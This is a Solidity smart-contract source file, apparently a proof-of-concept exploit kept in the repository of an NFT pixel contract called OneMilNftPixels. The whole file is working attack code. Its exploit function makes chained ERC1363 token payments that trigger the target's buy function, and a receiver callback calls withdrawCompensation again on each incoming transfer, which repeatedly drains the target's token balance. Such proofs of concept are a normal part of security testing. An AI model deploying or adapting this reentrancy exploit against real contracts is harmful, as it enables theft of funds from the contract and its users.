// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.0 <0.9.0;

import 'erc-payable-token/contracts/token/ERC1363/IERC1363.sol';
import 'erc-payable-token/contracts/token/ERC1363/IERC1363Receiver.sol';
import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol';
import '../OneMilNftPixels.sol';

contract ExploitOMP001 is IERC1363Receiver, Ownable, IERC721Receiver {
    IERC1363 public acceptedToken;
    address payable public vulnerableContract;
    uint256 private _compensation;

    bytes4 private constant FUNC_SELECTOR = OneMilNftPixels.buy.selector;

    event ExploitSuccess();

    modifier acceptedTokenOnly() {
        require(
            msg.sender == address(acceptedToken),
            'ERC1363Payable: accepts purchases in Lunas only'
        );
        _;
    }

    constructor(IERC1363 _acceptedToken, address payable _vulnerableContract) {
        require(
            address(_acceptedToken) != address(0),
            'ERC1363Payable: acceptedToken is zero address'
        );
        acceptedToken = _acceptedToken;
        vulnerableContract = _vulnerableContract;
        _compensation = 10;
    }

    function onTransferReceived(
        address /*operator*/,
        address sender,
        uint256 /*amount*/,
        bytes calldata /*data*/
    ) external override(IERC1363Receiver) acceptedTokenOnly returns (bytes4) {
        require(vulnerableContract == sender, 'Unrecognized sender.');
        uint256 balance = IERC1363(acceptedToken).balanceOf(vulnerableContract);
        if (balance >= _compensation) {
            OneMilNftPixels(vulnerableContract).withdrawCompensation(
                IERC1363Receiver(this)
            );
        }
        return IERC1363Receiver(this).onTransferReceived.selector;
    }

    function exploit(
        uint24 id,
        bytes3 colour,
        address sender,
        uint256 amount
    ) external onlyOwner {
        bytes memory msgdata = abi.encode(
            FUNC_SELECTOR,
            sender,
            id,
            colour,
            amount
        );
        bool result = IERC1363(acceptedToken).transferAndCall(
            vulnerableContract,
            amount,
            msgdata
        );
        require(result, 'Error 1');
        uint256 newAmount = amount + 25;
        msgdata = abi.encode(FUNC_SELECTOR, sender, id, colour, newAmount);
        result = IERC1363(acceptedToken).transferAndCall(
            vulnerableContract,
            newAmount,
            msgdata
        );
        require(result, 'Error 2');
        OneMilNftPixels(vulnerableContract).withdrawCompensation(
            IERC1363Receiver(this)
        );
        emit ExploitSuccess();
    }

    function onERC721Received(
        address /*operator*/,
        address /*from*/,
        uint256 /*tokenId*/,
        bytes calldata /*data*/
    ) external view override(IERC721Receiver) returns (bytes4) {
        return IERC721Receiver(this).onERC721Received.selector;
    }
}
